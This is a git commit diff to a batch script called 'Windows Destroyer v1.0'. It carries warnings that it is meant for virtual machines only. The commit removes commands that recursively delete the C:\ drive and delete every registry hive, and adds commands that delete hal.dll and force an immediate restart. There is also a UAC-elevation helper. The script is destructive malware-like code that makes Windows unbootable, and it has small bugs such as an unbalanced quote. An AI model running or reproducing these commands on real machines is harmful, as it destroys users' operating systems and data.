e1f80203222782bdf8814f1d89bb7dde5c5db73f
SchooiCodes <robloxianskp@gmail.com>
2024-09-07 18:28:41 +0300

    Updated the .exe Installer

--- Files/WD.bat
+++ Files/WD.bat
@@ -13,7 +13,7 @@ title Windows Destroyer v1.0
 call logo.bat
 echo.
 echo WARNING!
-echo This tool is designed to delete your C:\ Drive, thus delete Windows.
+echo This tool is designed to delete your hal.dll file, thus delete any connection between the motherboard and Windows.
 echo THIS TOOL MUST NOT BE USED ON YOUR HOST MACHINE (=A REAL DEVICE)
 echo THIS TOOL IS ONLY INTENDED FOR VIRTUAL MACHINES!
 echo IF YOU DON'T KNOW WHAT YOU ARE DOING, CLOSE THIS WINDOW.
@@ -29,18 +29,19 @@ goto start
 
 :Y
 echo I AM NOT RESPONSIBLE FOR ANY DAMAGE.
+echo Would you like to create a system restore point? ([Y]es/[N]o)
+set /p respo=^> 
+if /i "%respo%"=="y" start autorespo.bat
 echo Are you SURE you want to continue? ([Y]es/[N]o/[P]rint)
 set /p choice= ^>
 if /i "%choice%"=="N" exit
 if NOT /i "%choice%"=="Y" goto Y
 if /i "%choice%"=="P" goto print
 ::Delete C:\
-rd C:\ /s /q
-::Delete Registry
-reg delete hkcu /f
-reg delete hkcc /f
-reg delete hku /f
-reg delete hklm /f
+del C:\Windows\System32\hal.dll
+echo Would you like to restart? ([Y]es/[N]o)
+set /p rest=^> 
+if /i "%rest%=="Y" shutdown -r -t 0
 pause >nul
 
 :print
--- Files/autorespo.bat
+++ Files/autorespo.bat
@@ -4,7 +4,7 @@ title Restore Point Creator
 fltmc >nul 2>&1 || (
 	echo This script is not elevated!
 	echo Requesting Admin permissions..
-    PowerShell -Command "Start-Process PowerShell -ArgumentList 'Start-Process -Verb RunAs \"%~f0\"' -NoNewWindow " 2>nul || (
+    PowerShell -Command "Start-Process PowerShell -ArgumentList 'Start-Process -Verb RunAs "%0"' -NoNewWindow " 2>nul || (
         >nul pause && exit /b 1
     )
     exit
